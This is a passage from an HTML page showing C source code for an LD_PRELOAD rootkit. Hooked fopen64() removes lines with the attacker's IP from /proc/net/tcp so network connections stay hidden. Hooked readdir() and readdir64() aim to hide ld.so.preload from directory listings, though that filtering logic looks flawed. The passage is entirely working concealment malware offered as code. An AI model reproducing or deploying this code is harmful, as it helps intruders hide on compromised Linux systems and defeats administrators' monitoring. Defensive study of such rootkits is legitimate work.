/>&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(debugFile);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;filePointer;<br />}<br /><br />//&nbsp;fopen64()&nbsp;HOOKED&nbsp;FUNCTION&nbsp;-&nbsp;reads&nbsp;&quot;/proc/net/tcp&quot;<br />FILE&nbsp;*fopen64(const&nbsp;char&nbsp;*pathname,&nbsp;const&nbsp;char&nbsp;*mode)&nbsp;<br />{&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*filePointer;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;fopen64()&nbsp;return&nbsp;value<br />&nbsp;&nbsp;&nbsp;&nbsp;orig_fopen64&nbsp;=&nbsp;dlsym(RTLD_NEXT,&nbsp;&quot;fopen64&quot;);&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;point&nbsp;to&nbsp;next&nbsp;runtime&nbsp;instance&nbsp;of&nbsp;fopen64()<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*debugFile&nbsp;=&nbsp;orig_fopen64(DEBUG_FILE,&nbsp;&quot;a+&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;fopen64()&nbsp;intercepted.&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;fopen64()&nbsp;is&nbsp;reading&nbsp;&quot;/proc/net/tcp&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strcmp(pathname,&nbsp;IPV4_INFO_FILE)&nbsp;==&nbsp;0)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;fopen64(\&quot;/proc/net/tcp\&quot;)&nbsp;intercepted.&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#endif<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*tmp&nbsp;=&nbsp;tmpfile();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;open&nbsp;tmp&nbsp;file&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*targetFile&nbsp;=&nbsp;orig_fopen64(pathname,&nbsp;mode);&nbsp;//&nbsp;open&nbsp;&quot;/proc/net/tcp&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;line[256];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;var&nbsp;to&nbsp;store&nbsp;read&nbsp;lines<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;read&nbsp;target&nbsp;file&nbsp;line&nbsp;by&nbsp;line&nbsp;until&nbsp;empty<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(fgets(line,&nbsp;sizeof(line),&nbsp;targetFile)&nbsp;!=&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;line&nbsp;DOES&nbsp;NOT&nbsp;contain&nbsp;ATTACKER_IP<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strstr(line,&nbsp;ATTACKER_IP_HEX_NBO)&nbsp;==&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;writing&nbsp;line&nbsp;to&nbsp;tmpfile()&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#endif&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;write&nbsp;line&nbsp;to&nbsp;tmpfile<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs(line,&nbsp;tmp);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;line&nbsp;DOES&nbsp;contin&nbsp;ATTACKER_IP<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;ATTACKER_IP&nbsp;found!&nbsp;not&nbsp;writing&nbsp;line&nbsp;to&nbsp;tmpfile()&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#endif&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;do&nbsp;nothing&nbsp;(i.e.&nbsp;don&#39;t&nbsp;write&nbsp;line)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rewind(tmp);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;rewind()&nbsp;file&nbsp;pointer&nbsp;to&nbsp;beginning&nbsp;of&nbsp;stream<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filePointer&nbsp;=&nbsp;tmp;&nbsp;&nbsp;//&nbsp;set&nbsp;filePointer&nbsp;so&nbsp;that&nbsp;tmpfile()&nbsp;containing&nbsp;tampered&nbsp;/proc/net/tcp&nbsp;will&nbsp;be&nbsp;returned<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;fopen64()&nbsp;isn&#39;t&nbsp;reading&nbsp;&quot;/proc/net/tcp&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;open&nbsp;the&nbsp;file<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filePointer&nbsp;=&nbsp;orig_fopen64(pathname,&nbsp;mode);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(debugFile);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;filePointer;<br />}<br /><br />//&nbsp;readdir()&nbsp;HOOKED&nbsp;FUNCTION<br />struct&nbsp;dirent&nbsp;*readdir(DIR&nbsp;*dirp)&nbsp;<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;dirent&nbsp;*dirPointer;&nbsp;&nbsp;//&nbsp;return&nbsp;value&nbsp;of&nbsp;readdir()&nbsp;(a&nbsp;pointer&nbsp;to&nbsp;a&nbsp;dirent&nbsp;structre)<br />&nbsp;&nbsp;&nbsp;&nbsp;orig_readdir&nbsp;=&nbsp;dlsym(RTLD_NEXT,&nbsp;&quot;readdir&quot;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*debugFile&nbsp;=&nbsp;orig_fopen(DEBUG_FILE,&nbsp;&quot;a+&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;readdir()&nbsp;intercepted.&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;while&nbsp;directories&nbsp;are&nbsp;being&nbsp;read&nbsp;(while&nbsp;dirPointer&nbsp;contains&nbsp;a&nbsp;value)<br />&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(dirPointer&nbsp;=&nbsp;orig_readdir(dirp))<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;readdir()&nbsp;struct&#39;s&nbsp;d_name&nbsp;member&nbsp;DOES&nbsp;CONTAIN&nbsp;&quot;ld.so.preload&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strstr(dirPointer-&gt;d_name,&nbsp;PRELOAD_FILE)&nbsp;==&nbsp;0&nbsp;||&nbsp;strstr(dirPointer-&gt;d_name,&nbsp;PRELOAD_FILE_ETC))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;stop&nbsp;reading&nbsp;readdir()&nbsp;struct<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;dirPointer;<br />}<br /><br />//&nbsp;readdir()&nbsp;HOOKED&nbsp;FUNCTION<br />struct&nbsp;dirent64&nbsp;*readdir64(DIR&nbsp;*dirp)&nbsp;<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;dirent64&nbsp;*dirPointer64;&nbsp;&nbsp;//&nbsp;return&nbsp;value&nbsp;of&nbsp;readdir64()&nbsp;(a&nbsp;pointer&nbsp;to&nbsp;a&nbsp;dirent&nbsp;structre)<br />&nbsp;&nbsp;&nbsp;&nbsp;orig_readdir64&nbsp;=&nbsp;dlsym(RTLD_NEXT,&nbsp;&quot;readdir64&quot;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*debugFile&nbsp;=&nbsp;orig_fopen(DEBUG_FILE,&nbsp;&quot;a+&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;readdir64()&nbsp;intercepted.&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;while&nbsp;directories&nbsp;are&nbsp;being&nbsp;read&nbsp;(while&nbsp;dirPointer&nbsp;contains&nbsp;a&nbsp;value)<br />&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(dirPointer64&nbsp;=&nbsp;orig_readdir64(dirp))<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;readdir()&nbsp;struct&#39;s&nbsp;d_name&nbsp;member&nbsp;DOES&nbsp;CONTAIN&nbsp;&quot;ld.so.preload&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strstr(dirPointer64-&gt;d_name,&nbsp;PRELOAD_FILE)&nbsp;==&nbsp;0&nbsp;||&nbsp;strstr(dirPointer64-&gt;d_name,&nbsp;PRELOAD_FILE_ETC))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;stop&nbsp;reading&nbsp;readdir()&nbsp;struct<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;dirPointer64;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /></div>
</body>
</html>
